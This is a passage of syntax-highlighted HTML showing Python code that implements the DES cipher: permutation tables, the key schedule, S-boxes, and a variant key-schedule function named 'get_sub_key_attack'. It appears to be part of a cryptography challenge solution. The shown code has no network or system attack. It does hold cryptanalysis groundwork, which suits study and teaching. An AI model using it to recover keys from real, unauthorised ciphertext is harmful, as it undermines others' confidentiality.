class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> operator <span class=\"keyword\">import</span> add</span><br><span class=\"line\"><span class=\"keyword\">from</span> typing <span class=\"keyword\">import</span> <span class=\"type\">List</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> functools <span class=\"keyword\">import</span> reduce</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">_IP = [<span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>,</span><br><span class=\"line\">       <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>, <span class=\"number\">27</span>, <span class=\"number\">19</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>,</span><br><span class=\"line\">       <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>, <span class=\"number\">21</span>, <span class=\"number\">13</span>, <span class=\"number\">5</span>,</span><br><span class=\"line\">       <span class=\"number\">63</span>, <span class=\"number\">55</span>, <span class=\"number\">47</span>, <span class=\"number\">39</span>, <span class=\"number\">31</span>, <span class=\"number\">23</span>, <span class=\"number\">15</span>, <span class=\"number\">7</span>,</span><br><span class=\"line\">       <span class=\"number\">56</span>, <span class=\"number\">48</span>, <span class=\"number\">40</span>, <span class=\"number\">32</span>, <span class=\"number\">24</span>, <span class=\"number\">16</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>,</span><br><span class=\"line\">       <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>, <span class=\"number\">18</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>,</span><br><span class=\"line\">       <span class=\"number\">60</span>, <span class=\"number\">52</span>, <span class=\"number\">44</span>, <span class=\"number\">36</span>, <span class=\"number\">28</span>, <span class=\"number\">20</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">       <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">IP</span>(<span class=\"params\">plain: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [plain[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> _IP]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__pc1 = [<span class=\"number\">56</span>, <span class=\"number\">48</span>, <span class=\"number\">40</span>, <span class=\"number\">32</span>, <span class=\"number\">24</span>, <span class=\"number\">16</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">         <span class=\"number\">0</span>, <span class=\"number\">57</span>, <span class=\"number\">49</span>, <span class=\"number\">41</span>, <span class=\"number\">33</span>, <span class=\"number\">25</span>, <span class=\"number\">17</span>,</span><br><span class=\"line\">         <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">58</span>, <span class=\"number\">50</span>, <span class=\"number\">42</span>, <span class=\"number\">34</span>, <span class=\"number\">26</span>,</span><br><span class=\"line\">         <span class=\"number\">18</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>, <span class=\"number\">59</span>, <span class=\"number\">51</span>, <span class=\"number\">43</span>, <span class=\"number\">35</span>,</span><br><span class=\"line\">         <span class=\"number\">62</span>, <span class=\"number\">54</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>, <span class=\"number\">30</span>, <span class=\"number\">22</span>, <span class=\"number\">14</span>,</span><br><span class=\"line\">         <span class=\"number\">6</span>, <span class=\"number\">61</span>, <span class=\"number\">53</span>, <span class=\"number\">45</span>, <span class=\"number\">37</span>, <span class=\"number\">29</span>, <span class=\"number\">21</span>,</span><br><span class=\"line\">         <span class=\"number\">13</span>, <span class=\"number\">5</span>, <span class=\"number\">60</span>, <span class=\"number\">52</span>, <span class=\"number\">44</span>, <span class=\"number\">36</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">         <span class=\"number\">20</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">27</span>, <span class=\"number\">19</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span></span><br><span class=\"line\">         ]</span><br><span class=\"line\"></span><br><span class=\"line\">__pc2 = [</span><br><span class=\"line\">    <span class=\"number\">13</span>, <span class=\"number\">16</span>, <span class=\"number\">10</span>, <span class=\"number\">23</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">    <span class=\"number\">2</span>, <span class=\"number\">27</span>, <span class=\"number\">14</span>, <span class=\"number\">5</span>, <span class=\"number\">20</span>, <span class=\"number\">9</span>,</span><br><span class=\"line\">    <span class=\"number\">22</span>, <span class=\"number\">18</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">25</span>, <span class=\"number\">7</span>,</span><br><span class=\"line\">    <span class=\"number\">15</span>, <span class=\"number\">6</span>, <span class=\"number\">26</span>, <span class=\"number\">19</span>, <span class=\"number\">12</span>, <span class=\"number\">1</span>,</span><br><span class=\"line\">    <span class=\"number\">40</span>, <span class=\"number\">51</span>, <span class=\"number\">30</span>, <span class=\"number\">36</span>, <span class=\"number\">46</span>, <span class=\"number\">54</span>,</span><br><span class=\"line\">    <span class=\"number\">29</span>, <span class=\"number\">39</span>, <span class=\"number\">50</span>, <span class=\"number\">44</span>, <span class=\"number\">32</span>, <span class=\"number\">47</span>,</span><br><span class=\"line\">    <span class=\"number\">43</span>, <span class=\"number\">48</span>, <span class=\"number\">38</span>, <span class=\"number\">55</span>, <span class=\"number\">33</span>, <span class=\"number\">52</span>,</span><br><span class=\"line\">    <span class=\"number\">45</span>, <span class=\"number\">41</span>, <span class=\"number\">49</span>, <span class=\"number\">35</span>, <span class=\"number\">28</span>, <span class=\"number\">31</span></span><br><span class=\"line\">]</span><br><span class=\"line\">ROTATIONS = [<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">PC_1</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [key[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __pc1]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">PC_2</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [key[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __pc2]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sub_key</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]:</span><br><span class=\"line\">    key = PC_1(key)</span><br><span class=\"line\">    L, R = key[:<span class=\"number\">28</span>], key[<span class=\"number\">28</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    sub_keys = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[i]):</span><br><span class=\"line\">            L.append(L.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\">            R.append(R.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        combined = L + R</span><br><span class=\"line\">        sub_key = PC_2(combined)</span><br><span class=\"line\">        sub_keys.append(sub_key)</span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;LL=&#x27;, L[:19])</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;Rr=&#x27;, R)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sub_keys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_sub_key_attack</span>(<span class=\"params\">key: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"type\">List</span>[<span class=\"built_in\">int</span>]]:</span><br><span class=\"line\">    L, R = key[:<span class=\"number\">28</span>], key[<span class=\"number\">28</span>:]</span><br><span class=\"line\"></span><br><span class=\"line\">    sub_keys = []</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[i]):</span><br><span class=\"line\">            L.append(L.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\">            R.append(R.pop(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        combined = L + R</span><br><span class=\"line\">        sub_key = PC_2(combined)</span><br><span class=\"line\">        sub_keys.append(sub_key)</span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;LL=&#x27;, L[:19])</span></span><br><span class=\"line\">    <span class=\"comment\"># print(&#x27;Rr=&#x27;, R)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sub_keys</span><br><span class=\"line\"></span><br><span class=\"line\">__ep = [<span class=\"number\">31</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>,</span><br><span class=\"line\">        <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">        <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>,</span><br><span class=\"line\">        <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>,</span><br><span class=\"line\">        <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>,</span><br><span class=\"line\">        <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">21</span>, <span class=\"number\">22</span>, <span class=\"number\">23</span>, <span class=\"number\">24</span>,</span><br><span class=\"line\">        <span class=\"number\">23</span>, <span class=\"number\">24</span>, <span class=\"number\">25</span>, <span class=\"number\">26</span>, <span class=\"number\">27</span>, <span class=\"number\">28</span>,</span><br><span class=\"line\">        <span class=\"number\">27</span>, <span class=\"number\">28</span>, <span class=\"number\">29</span>, <span class=\"number\">30</span>, <span class=\"number\">31</span>, <span class=\"number\">0</span></span><br><span class=\"line\">        ]</span><br><span class=\"line\"></span><br><span class=\"line\">__p = [<span class=\"number\">15</span>, <span class=\"number\">6</span>, <span class=\"number\">19</span>, <span class=\"number\">20</span>, <span class=\"number\">28</span>, <span class=\"number\">11</span>, <span class=\"number\">27</span>, <span class=\"number\">16</span>,</span><br><span class=\"line\">       <span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">22</span>, <span class=\"number\">25</span>, <span class=\"number\">4</span>, <span class=\"number\">17</span>, <span class=\"number\">30</span>, <span class=\"number\">9</span>,</span><br><span class=\"line\">       <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">23</span>, <span class=\"number\">13</span>, <span class=\"number\">31</span>, <span class=\"number\">26</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>,</span><br><span class=\"line\">       <span class=\"number\">18</span>, <span class=\"number\">12</span>, <span class=\"number\">29</span>, <span class=\"number\">5</span>, <span class=\"number\">21</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">24</span></span><br><span class=\"line\">       ]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">EP</span>(<span class=\"params\">data: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [data[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __ep]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">P</span>(<span class=\"params\">data: <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]</span>) -&gt; <span class=\"type\">List</span>[<span class=\"built_in\">int</span>]:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [data[x] <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> __p]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__s_box = [</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">14</span>, <span class=\"number\">4</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">15</span>, <span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">        [<span class=\"number\">0</span>, <span class=\"number\">15</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">12</span>, <span class=\"number\">11</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">14</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>, <span class=\"number\">6</span>, <span class=\"number\">2</span>, <span class=\"number\">11</span>, <span class=\"number\">15</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">3</span>, <span class=\"number\">10</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>],</span><br><span class=\"line\">        [<span class=\"number\">15</span>, <span class=\"number\">12</span>, <span class=\"number\">8</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">14</span>, <span class=\"number\">10</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">13</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">15</span>, <span class=\"number\">1</span>, <span class=\"number\">8</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">13</span>, <span class=\"number\">12</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>],</span><br><span class=\"line\">        [<span class=\"number\">3</span>, <span class=\"number\">13</span>, <span class=\"number\">4</span>, <span class=\"number\">7</span>, <span class=\"number\">15</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">14</span>, <span class=\"number\">12</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">11</span>, <span class=\"number\">5</span>],</span><br><span class=\"line\">        [<span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>, <span class=\"number\">11</span>, <span class=\"number\">10</span>, <span class=\"number\">4</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">8</span>, <span class=\"number\">12</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">15</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">12</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">10</span>, <span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">14</span>, <span class=\"number\">6</span>, <span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>, <span class=\"number\">11</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">7</span>, <span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">14</span>, <span class=\"number\">12</span>, <span class=\"number\">11</span>, <span class=\"number\">15</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">6</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">15</span>, <span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">11</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">        [<span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">13</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">15</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">11</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">7</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">15</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">11</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>],</span><br><span class=\"line\">        [<span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">9</span>, <span class=\"number\">0</span>, <span class=\"number\">12</span>, <span class=\"number\">11</span>, <span class=\"number\">7</span>, <span class=\"number\">13</span>, <span class=\"number\">15</span>, <span class=\"number\">1</span>, <span class=\"number\">3</span>, <span class=\"number\">14</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">        [<span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>, <span class=\"number\">2</span>, <span class=\"number\">14</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>, <span class=\"number\">15</span>, <span class=\"number\">13</span>, <span class=\"number\">0</span>, <span class=\"number\">14</span>, <span class=\"number\">9</span>],</span><br><span class=\"line\">        [<span class=\"number\">14</span>, <span class=\"number\">11</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">4</span>, <span class=\"number\">7</span>, <span class=\"number\">13</span>, <span class=\"number\">1</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">15</span>, <span class=\"number\">10</span>, <span class=\"number\">3</span>, <span class=\"number\">9</span>, <span class=\"number\">8</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>, <span class=\"number\">11</span>, <span class=\"number\">10</span>, <span class=\"number\">13</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">15</span>, <span class=\"number\">9</span>, <span class=\"number\">12</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">14</span>],</span><br><span class=\"line\">        [<span class=\"number\">11</span>, <span class=\"number\">8</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>, <span class=\"number\">1</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">13</span>, <span class=\"number\">6</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">9</span>, <span class=\"number\">10</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">12</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">15</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>, <span class=\"number\">13</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">14</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">11</span>],</span><br><span class=\"line\">        [<span class=\"number\">10</span>, <span class=\"number\">15</span>, <span class=\"number\">4</span>, <span class=\"number\">2</span>, <span class=\"number\">7</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">0</span>, <span class=\"number\">11</span>, <span class=\"number\">3</span>, <span class=\"number\">8</span>],</span><br><span class=\"line\">        [<span class=\"number\">9</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">5</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">12</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">1</span>, <span class=\"number\">13</span>, <span class=\"number\">11</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">3</span>, <span class=\"number\">2</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">15</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">14</span>, <span class=\"number\">1</span>, <span class=\"number\">7</span>, <span class=\"number\">6</span>, <span class=\"number\">0</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">2</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, <span class=\"number\">8</span>, <span class=\"number\">13</span>, <span class=\"number\">3</span>, <span class=\"number\">12</span>, <span class=\"number\">9</span>, <span class=\"number\">7</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>, <span class=\"number\">6</span>, <span class=\"number\">1</span>],</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">0</span>, <span class=\"number\">11</span>, <span class=\"number\">7</span>, <span class=\"number\">4</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">5</span>, <span class=\"number\">12</span>, <span class=\"number\">2</span>, <span class=\"number\">15</span>, <span class=\"number\">8</span>, <span class=\"number\">6</span>],</span><br><span class=\"line\">        [<span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">12</span>, <span class=\"number\">3</span>, <span class=\"number\">7</span>, <span class=\"number\">14</span>, <span class=\"number\">10</span>, <span class=\"number\">15</span>, <span class=\"number\">6</span>, <span class=\"number\">8</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">9</span>, <span class=\"number\">2</span>],</span><br><span class=\"line\">        [<span class=\"number\">6</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">8</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">7</span>, <span class=\"number\">9</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">15</span>, <span class=\"number\">14</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">12</span>]</span><br><span class=\"line\">    ],</span><br><span class=\"line\"></span><br><span class=\"line\">    [</span><br><span class=\"line\">        [<span class=\"number\">13</span>, <span class=\"number\">2</span>, <span class=\"number\">8</span>, <span class=\"number\">4</span>, <span class=\"number\">6</span>, <span class=\"number\">15</span>, <span class=\"number\">11</span>, <span class=\"number\">1</span>, <span class=\"number\">10</span>, <span class=\"number\">9</span>, <span class=\"number\">3</span>, <span class=\"number\">14</span>, <span class=\"number\">5</span>, <span class=\"number\">0</span>, <span class=\"number\">12</span>, <span class=\"number\">7</span>],</span><br><span class=\"line\">        [<span 